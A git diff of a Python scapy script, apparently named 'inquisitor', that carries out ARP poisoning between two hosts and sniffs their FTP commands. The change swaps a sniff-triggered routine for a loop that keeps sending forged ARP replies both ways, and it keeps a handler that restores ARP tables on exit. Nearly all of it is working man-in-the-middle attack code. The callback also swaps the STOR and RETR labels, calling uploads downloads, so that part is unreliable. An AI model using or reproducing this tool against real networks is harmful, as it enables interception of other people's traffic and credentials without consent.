@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 
-import sys, socket, argparse, re, signal
-from scapy.all import ARP, Ether, srp, sniff, sendp, conf, TCP, UDP, Raw
+import sys, socket, argparse, re, signal, time
+from scapy.all import ARP, Ether, sniff, sendp, conf, TCP, UDP, Raw, send
 
 
 def validate_ipv4(address):
@@ -19,38 +19,16 @@ def restore_arp_tables(src_ip, src_mac, target_ip, target_mac, interface='eth0')
     arp_restore_src = ARP(pdst=target_ip, psrc=src_ip, hwdst=target_mac, hwsrc=src_mac, op=2)
     arp_restore_target = ARP(pdst=src_ip, psrc=target_ip, hwdst=src_mac, hwsrc=target_mac, op=2)
     
-    sendp(Ether(dst=target_mac, src=src_mac) / arp_restore_src, iface=interface, verbose=False)
-    sendp(Ether(dst=src_mac, src=target_mac) / arp_restore_target, iface=interface, verbose=False)
+    send(arp_restore_src, verbose=False, count=3)
+    send(arp_restore_target, verbose=False, count=3)
     
     print("Original ARP tables restored.")
 
 
-def arp_poison(src_ip, src_mac, target_ip, target_mac, interface='eth0'):
-    def poison_packet(pkt):
-        print("poison_packet called")
-        if ARP in pkt and ((pkt[ARP].psrc == src_ip and pkt[ARP].pdst == target_ip) or (pkt[ARP].psrc == target_ip and pkt[ARP].pdst == src_ip)):
-            arp_reply_src_to_target = ARP(pdst=target_ip, psrc=src_ip, hwdst=target_mac, hwsrc=src_mac, op=2)
-            ether_frame_src_to_target = Ether(dst=target_mac, src=src_mac) / arp_reply_src_to_target
-            sendp(ether_frame_src_to_target, iface=interface, verbose=False)
-            print(f"Packet sent from {src_ip} to {target_ip}")
+def arp_poison(ip_target, mac_target, ip_src, mac_src, interface='eth0'):
+    packet = ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src)
+    send(packet, verbose=False, count=7)
 
-            arp_reply_target_to_src = ARP(pdst=src_ip, psrc=target_ip, hwdst=src_mac, hwsrc=target_mac, op=2)
-            ether_frame_target_to_src = Ether(dst=src_mac, src=target_mac) / arp_reply_target_to_src
-            sendp(ether_frame_target_to_src, iface=interface, verbose=False)
-            print(f"Packet sent from {target_ip} to {src_ip}")
-
-            print(pkt.summary())
-
-        elif pkt.haslayer(TCP) and pkt[TCP].dport == 20 or pkt[TCP].sport == 20:
-            ftp_command = str(pkt[Raw].load.decode())
-            if "PORT" in ftp_command.upper() or "PASV" in ftp_command.upper():
-                print("FTP File Transfer Detected:", ftp_command)
-
-        else:
-            print("No ARP packet to poison or no FTP file transfer detected")
-
-    print(f"ARP Poisoning started. Press CTRL+C to stop.")
-    sniff(iface=interface, prn=lambda x: poison_packet(x), store=0)
 
 def cleanup(signum, frame):
     print("\nStopping ARP poisoning and restoring network...")
@@ -58,6 +36,16 @@ def cleanup(signum, frame):
     restore_arp_tables(src_ip, src_mac, target_ip, target_mac)
     print("ARP Poisoning stopped.")
     sys.exit(0)
+
+
+def callback(packet):
+    if packet.haslayer(TCP) and packet.haslayer(Raw):
+        payload = packet[Raw].load
+        if b"STOR" in payload:
+            print(f"Download FTP file transfer detected: {payload.decode(errors='ignore')}")
+        if b"RETR" in payload:
+            print(f"Upload FTP file transfer detected: {payload.decode(errors='ignore')}")
+
 
 def ft_parser_args():
     parser = argparse.ArgumentParser(description='ARP poisoning,./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>')
@@ -78,8 +66,12 @@ def main():
             exit(1)
         print("Valid IP addresses entered.")
         signal.signal(signal.SIGINT, cleanup)
-        arp_poison(ip_src, mac_src, ip_target, mac_target)
-        print("ARP Poisoning completed successfully.")
+        print(f"ARP Poisoning started. Press CTRL+C to stop.")
+        while True:
+            arp_poison(ip_target, mac_target, ip_src, mac_src)
+            arp_poison(ip_src, mac_src, ip_target, mac_target)
+            sniff(iface="eth0", filter="tcp port 21", prn=callback, timeout=10)
+            time.sleep(2)
     except ValueError:
         print("Invalid IP address format")
     except Exception as e:
